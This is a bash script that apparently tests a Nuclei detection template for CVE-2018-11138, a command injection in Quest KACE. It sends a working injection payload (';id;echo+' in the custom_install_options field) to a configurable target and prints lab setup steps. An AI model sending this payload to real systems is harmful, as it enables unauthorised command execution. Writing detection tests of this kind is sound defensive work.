#!/bin/bash

# CVE-2018-11138 - Quest KACE RCE Template Test Script
# This script tests the Nuclei template and provides debug output

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
TARGET_URL="${1:-http://localhost:8080}"
TEMPLATE_PATH="http/cves/2018/CVE-2018-11138.yaml"
DEBUG_OUTPUT="debug-output.txt"

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}CVE-2018-11138 - Quest KACE RCE Tester${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "Target: ${YELLOW}${TARGET_URL}${NC}"
echo -e "Template: ${YELLOW}${TEMPLATE_PATH}${NC}"
echo ""

# Function to check if target is reachable
check_target() {
    echo -e "${BLUE}[+] Checking if target is reachable...${NC}"
    if curl -s --connect-timeout 10 "${TARGET_URL}" > /dev/null; then
        echo -e "${GREEN}[+] Target is reachable${NC}"
        return 0
    else
        echo -e "${RED}[-] Target is not reachable${NC}"
        return 1
    fi
}

# Function to check if template exists
check_template() {
    echo -e "${BLUE}[+] Checking if template exists...${NC}"
    if [ -f "${TEMPLATE_PATH}" ]; then
        echo -e "${GREEN}[+] Template found: ${TEMPLATE_PATH}${NC}"
        return 0
    else
        echo -e "${RED}[-] Template not found: ${TEMPLATE_PATH}${NC}"
        return 1
    fi
}

# Function to test basic detection
test_basic_detection() {
    echo -e "${BLUE}[+] Testing basic detection...${NC}"
    response=$(curl -s "${TARGET_URL}")
    if echo "$response" | grep -q "KACE\|Quest"; then
        echo -e "${GREEN}[+] Quest KACE system detected${NC}"
        return 0
    else
        echo -e "${YELLOW}[-] Quest KACE system not detected${NC}"
        return 1
    fi
}

# Function to test vulnerable endpoint manually
test_vulnerable_endpoint() {
    echo -e "${BLUE}[+] Testing vulnerable endpoint manually...${NC}"
    
    # Test payload
    payload=";id;echo+"
    
    echo -e "${YELLOW}[*] Sending payload: ${payload}${NC}"
    
    response=$(curl -s -X POST "${TARGET_URL}/common/download_agent_installer.php" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "platform=linux&custom_install_options=${payload}")
    
    if echo "$response" | grep -q "uid="; then
        echo -e "${GREEN}[+] VULNERABLE! Command execution detected${NC}"
        echo -e "${YELLOW}[*] Response preview:${NC}"
        echo "$response" | head -10
        return 0
    else
        echo -e "${RED}[-] No command execution detected${NC}"
        return 1
    fi
}

# Function to run Nuclei template test
run_nuclei_test() {
    echo -e "${BLUE}[+] Running Nuclei template test...${NC}"
    
    # Check if nuclei is installed
    if ! command -v nuclei &> /dev/null; then
        echo -e "${RED}[-] Nuclei is not installed. Please install it first.${NC}"
        echo -e "${YELLOW}[*] Installation: https://nuclei.projectdiscovery.io/nuclei/get-started/${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Running: nuclei -u ${TARGET_URL} -t ${TEMPLATE_PATH} -debug -v${NC}"
    
    # Run nuclei with debug output
    nuclei -u "${TARGET_URL}" -t "${TEMPLATE_PATH}" -debug -v 2>&1 | tee "${DEBUG_OUTPUT}"
    
    # Check if vulnerability was detected
    if grep -q "CVE-2018-11138" "${DEBUG_OUTPUT}"; then
        echo -e "${GREEN}[+] Nuclei detected the vulnerability!${NC}"
        return 0
    else
        echo -e "${RED}[-] Nuclei did not detect the vulnerability${NC}"
        return 1
    fi
}

# Function to show debug output
show_debug_output() {
    if [ -f "${DEBUG_OUTPUT}" ]; then
        echo -e "${BLUE}[+] Debug output saved to: ${DEBUG_OUTPUT}${NC}"
        echo -e "${YELLOW}[*] Last 20 lines of debug output:${NC}"
        echo "----------------------------------------"
        tail -20 "${DEBUG_OUTPUT}"
        echo "----------------------------------------"
    fi
}

# Function to provide testing instructions
show_instructions() {
    echo -e "${BLUE}[+] Testing Instructions:${NC}"
    echo ""
    echo -e "${YELLOW}1. Start the vulnerable environment:${NC}"
    echo "   cd code/cves/2018/CVE-2018-11138"
    echo "   docker-compose up -d"
    echo ""
    echo -e "${YELLOW}2. Test with curl:${NC}"
    echo "   curl -X POST http://localhost:8080/common/download_agent_installer.php \\"
    echo "     -H \"Content-Type: application/x-www-form-urlencoded\" \\"
    echo "     -d \"platform=linux&custom_install_options=;id;echo+\""
    echo ""
    echo -e "${YELLOW}3. Test with Python script:${NC}"
    echo "   python3 test-payloads.py http://localhost:8080"
    echo ""
    echo -e "${YELLOW}4. Test with Nuclei:${NC}"
    echo "   nuclei -u http://localhost:8080 -t http/cves/2018/CVE-2018-11138.yaml -debug"
    echo ""
}

# Main execution
main() {
    echo -e "${BLUE}[+] Starting CVE-2018-11138 vulnerability test${NC}"
    echo ""
    
    # Check prerequisites
    if ! check_target; then
        echo -e "${YELLOW}[*] Please ensure the target is running and accessible${NC}"
        show_instructions
        exit 1
    fi
    
    if ! check_template; then
        echo -e "${RED}[-] Template not found. Please run this script from the nuclei-templates root directory${NC}"
        exit 1
    fi
    
    echo ""
    
    # Run tests
    test_basic_detection
    echo ""
    
    test_vulnerable_endpoint
    echo ""
    
    run_nuclei_test
    echo ""
    
    show_debug_output
    echo ""
    
    echo -e "${BLUE}[+] Test completed!${NC}"
    echo -e "${YELLOW}[*] Check ${DEBUG_OUTPUT} for full debug output${NC}"
}

# Run main function
main "$@" 